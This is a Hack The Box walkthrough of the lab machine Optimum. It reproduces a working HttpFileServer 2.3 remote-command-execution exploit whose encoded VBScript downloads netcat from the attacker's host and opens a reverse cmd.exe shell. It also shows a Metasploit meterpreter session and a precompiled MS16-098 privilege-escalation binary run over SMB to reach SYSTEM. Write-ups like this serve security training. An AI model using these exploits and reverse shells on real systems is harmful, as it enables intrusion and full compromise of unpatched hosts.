---
layout: post
title: HTB Optimum
modified: 2021-06-09
categories: [Hack The Box]
---

<style>
img {
  width: 93%;
  height: 93%;
}
</style>

#  HackTheBox | Optimum

## Initial TCP Nmap Scan

```
nmap -sC -sV 10.10.10.8
```

```
Nmap scan report for 10.10.10.8
Host is up (0.076s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

## Full TCP Nmap Scan

```
nmap -sC -sV -p- 10.10.10.8
```

```
Nmap scan report for 10.10.10.8
Host is up (0.076s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

## Initial Thoughts Based On Nmap Scanse

There isn't really a whole lot I am thinking about besides looking into `HTTP` on port `80` since that is the only service that seems to be open with a full and quick TCP Nmap scan. There is some pretty valuable information from the scan though which is the service that is running and the version. The service and version is `HttpFileServer httpd 2.3`. We also get some OS information which says it may be a Windows box. With this in mind, my initial thought is to simply navigate to the website and just manually enumerate the service. I will most likely begin trying to search on Google for "HttpFileServer 2.3 exploit" to see if there is already a proof of concept to exploit this service. If not, I will manually enumerate it and see if there is an attack vector that I can exploit and gain initial access onto the host.

## 80 - HTTP | Enumeration

Navigating to `10.10.10.8` the following web page is presented:

<p align="center">
  <img src="{{ site.github.url }}/images/htb/optimum/image-20210614085519968.png" />
</p>

Google searching for `HTTP File Server`, we start to understand that this is a free web server that is designed for publishing and sharing files. There are also a plethora of exploits available by searching up `HTTP File Server 2.3 exploit` on Google. The one I am going to use is the one from [ExploitDB](https://www.exploit-db.com/exploits/39161). 

```
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
 
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!


import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
```

## Low Privilege Shell on Target Host

Looking at the usage on the top of the source code, it is pretty simple. There is also an EDB note stating that we need to be using a web server hosting netcat. Seems simple enough, so let's do it. Let's first download the file and put it in a directory for this machine to stay organized. Next all we need to do is be using a `HTTP Server` on port `80` that is hosting a `Netcat binary`. Kali Linux already comes with Windows binaries in the `/usr/share/windows-binaries` directory so let's change our directory into that.  Your directory should look something like this:

```
root@kali-[~/htb/optimum/exploits]cd /usr/share/windows-binaries                                                                                                                                                                                                                                       
root@kali-[/usr/share/windows-binaries]ls -lah
total 1.9M
drwxr-xr-x  7 root root 4.0K May 28 18:40 .
drwxr-xr-x 14 root root 4.0K May  1 17:10 ..
drwxr-xr-x  2 root root 4.0K May  1 17:09 enumplus
-rwxr-xr-x  1 root root  52K Jul 17  2019 exe2bat.exe
drwxr-xr-x  2 root root 4.0K May  1 17:09 fgdump
drwxr-xr-x  2 root root 4.0K May  1 17:09 fport
-rwxr-xr-x  1 root root  23K Jul 17  2019 klogger.exe
drwxr-xr-x  2 root root 4.0K May  1 17:09 mbenum
drwxr-xr-x  4 root root 4.0K May  1 17:09 nbtenum
-rw-r--r--  1 root root  45K May 28 18:40 nc64.exe
-rwxr-xr-x  1 root root  58K Jul 17  2019 nc.exe
-rwxr-xr-x  1 root root 304K Jul 17  2019 plink.exe
-rwxr-xr-x  1 root root 688K Jul 17  2019 radmin.exe
-rwxr-xr-x  1 root root 356K Jul 17  2019 vncviewer.exe
-rwxr-xr-x  1 root root 302K Jul 17  2019 wget.exe
-rwxr-xr-x  1 root root  65K Jul 17  2019 whoami.exe
```

We can see `nc.exe` is in this directory. Since we're already in this directory, simply running the following command will start up a `HTTP Server` for us in this directory.

```
python -m SimpleHTTPServer 80
```

```
root@kali-[/usr/share/windows-binaries]python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Now we just need to run the exploit from the file we downloaded from **ExploitDB**. But before we do that there is one thing we need to change within the exploit to make it work: the `ip_addr` variable. So I go ahead and change `ip_addr = "192.168.44.128"` to `ip_addr = "10.10.14.36"`. This variable is used to help specify what IP to use connect to our HTTP Server. Looking at the usage we can see that we need to run `python 39161.py  <TARGET_IP_ADDR> <Target Port Number>`. So the target IP address is just going to be `10.10.10.8` and the port number is going to be `80` since this is where the service is being hosted. We also need to have our `Netcat` listener on port `443` listening so we get a callback.

```
nc -lvnp 443
```

```
python 39161.py 10.10.10.8 80
```

```
root@kali-[~]nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.8] 49207
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas
```

And we get a low privileged shell! We could also get a shell through the `Metasploit Framework` which will be shown below:

## Low Privilege Shell on Target Host w/ Metasploit

```
root@kali-[~]msfconsole                                                                                               
                                                                                                                      
                                                                                                                      
     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
                                `...............`              `...-/////...`
                                                           
                                                           
                                  .::::::::::-.                     .::::::-
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo              
                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy              
                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`                                                                                                                                                               
                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/                                     
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================      
=====================+--------------------------------+=========================                     
================================================================================                                                                                                                                                            
                                                                                                                      
                     Press ENTER to size up the situation                                                                                                                                                                                   
                                                                                                                      
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%   
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%                         
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%            
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
                                                           
                        Press SPACE BAR to continue
                                                           
                                                           
                                                                                                                      
       =[ metasploit v6.0.46-dev                          ]                                                           
+ -- --=[ 2135 exploits - 1139 auxiliary - 365 post       ] 
+ -- --=[ 594 payloads - 45 encoders - 10 nops            ] 
+ -- --=[ 8 evasion                                       ] 
                                                           
Metasploit tip: Start commands with a space to avoid saving  
them to history
                                                           
msf6 > search httpfile

Matching Modules
================                              

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.159.129  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.14.36
LHOST => 10.10.14.36
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
RHOSTS => 10.10.10.8
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
[*] Started reverse TCP handler on 10.10.14.36:4444 
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080).
[*] Exploit completed, but no session was created.
msf6 exploit(windows/http/rejetto_hfs_exec) > set SRVPORT 8081
SRVPORT => 8081
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.36:4444 
[*] Using URL: http://0.0.0.0:8081/atxkpZGbxVDyVXT
[*] Local IP: http://192.168.159.129:8081/atxkpZGbxVDyVXT
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /atxkpZGbxVDyVXT
[*] Sending stage (175174 bytes) to 10.10.10.8
[!] Tried to delete %TEMP%\DCFfFCwzu.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.14.36:4444 -> 10.10.10.8:49198) at 2021-06-14 09:21:46 -0700
[*] Server stopped.

meterpreter > shell
Process 2040 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas
```

## Privilege Escalation

Now that we have a low privilege shell on the host, it is time to start looking into how we are going to escalate our privileges. One thing that I have mentioned before in previous HackTheBox blog posts about Windows hosts is running `whoami /all` and `systeminfo` are some good things to do when you first get on a box since it will give you a vast amount of information.  For this box in particular I am going to be utilizing `systeminfo` with a tool known as [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester). Basically given the output of `systeminfo` on a given Windows host, if you feed the output into **Windows Exploit Suggester**, it will begin looking for known exploits based off of the `systeminfo` output. So let's go ahead and clone it onto our host.

```
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
```

Go ahead and change directories into `Windows-Exploit-Suggester`.

```
cd Windows-Exploit-Suggester
```

We are going to install the dependencies that are specified in the `readme` document.

```
pip install xlrd --upgrade
```

Lastly we are going to update the database since it creates an excel spreadsheet from the Microsoft vulnerability database and puts it into our working directory.

```
./windows-exploit-suggester.py --update
```

With all of that done we are ready to use this tool. Go back to the compromised Windows host and run `systeminfo`. My output looks like the following:

```
Host Name:                 OPTIMUM        
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation  
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User   
Registered Organization:                  
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 
System Boot Time:          21/6/2021, 3:49:03 
System Manufacturer:       VMware, Inc.   
System Model:              VMware Virtual Platform
System Type:               x64-based PC   
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows     
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek       
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB       
Available Physical Memory: 3.489 MB       
Virtual Memory: Max Size:  5.503 MB       
Virtual Memory: Available: 4.935 MB       
Virtual Memory: In Use:    568 MB         
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB            
Logon Server:              \\OPTIMUM      
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189    
                           [05]: KB2928120                                                                            
                           [06]: KB2931358                 
                           [07]: KB2931366          
                           [08]: KB2933826     
                           [09]: KB2938772       
                           [10]: KB2949621                                                                            
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Go ahead and copy all of the output and paste it into a text file on your own host. I named my file `systeminfo.txt`. Now go to where you cloned the `Windows-Exploit-Suggester` tool and run the following command:

```
./windows-exploit-suggester.py --database [year]-[month]-[day]-mssb.xls --systeminfo [path/to/systeminfo.txt]
```

The path to your `systeminfo.txt` file and the `database file` will be different depending on when you updated the database and where you stored your `systeminfo.txt` file. My command looks like this:

```
./windows-exploit-suggester.py --database 2021-05-28-mssb.xls --systeminfo ~/htb/optimum/systeminfo.txt
```

I go ahead and run the tool and get the following output:

```
root@kali-[/opt/Windows-Exploit-Suggester]./windows-exploit-suggester.py --database 2021-05-28-mssb.xls --systeminfo ~/htb/optimum/systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension                                            
[*] attempting to read from the systeminfo input file                                                                                                                                                                                       
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities                                                              
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits                                                                                                                                
[*] there are now 246 remaining vulns                                                                                                                                                                                                       
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin                                                   
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*]                                                                                                                   
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important                                                                                                                                                         
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255                                          
[*]                                                                                                                   
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]                                                                                                                                                                                                                                         
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato                                                                     
[*]   https://github.com/Kevin-Robertson/Tater                                                                        
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]                                                                                                                   
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important                                                                                                                                                        
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*] 
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical                                                                                                                                                         
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC     
[*] 
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*]                                                                                                                                                                                                                                         
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important                                                                                                                                            
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF                                                                                                                              
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC   
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*] 
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC                                                                                                                                  
[*]                                                                                                                   
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*] 
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important           
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC 
[*] 
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*] 
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*] 
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*] 
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*] 
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
[*] 
[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[*] done
```

As you can see it found a ton of possible exploits that could escalate our privileges. Since there is a lot of output, I typically like to look at anything relating to `kernels` first since they tend to be fairly reliable. I also tend to try to look for any known proof-of-concepts already such as an already precompiled executable or something of that sort. The `MS16-098` seems to be pretty interesting. There is an [ExploitDB](https://www.exploit-db.com/exploits/41020) link to a proof-of-concept and also has a precompiled binary as well at https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe. On my host, I simply use the `wget` command to download the file and put it into my exploits directory. 

```
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
```

I am going to host a `SMB server` using [Impacket's](https://github.com/SecureAuthCorp/impacket) `smbserver.py` tool. This makes it easy to execute a binary on the compromised Windows host by simply having the Windows host connect to our SMB server and run the binary. All we need to do is run this command within the directory that we have the MS16-098 exploit binary, connect to it from the Windows host, and we should have escalated our privileges.

```
smbserver.py share .
```

```
root@kali-[~/htb/optimum/exploits]ls -lah
total 560K
drwxr-xr-x 2 root root 4.0K Jun 14 11:02 .
drwxr-xr-x 6 root root 4.0K Jun 14 10:54 ..
-rw-r--r-- 1 root root 2.5K Jun 14 09:38 39161.py
-rw-r--r-- 1 root root 547K Jun 14 11:02 41020.exe
                                                                                                                                                                                                                                            
root@kali-[~/htb/optimum/exploits]smbserver.py share .
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now within the Windows host I ran this command

```
\\10.10.14.36\share\41020.exe
```

```
C:\Users\kostas\Desktop>\\10.10.14.36\share\41020.exe
\\10.10.14.36\share\41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```

And we have a `SYSTEM` shell! 

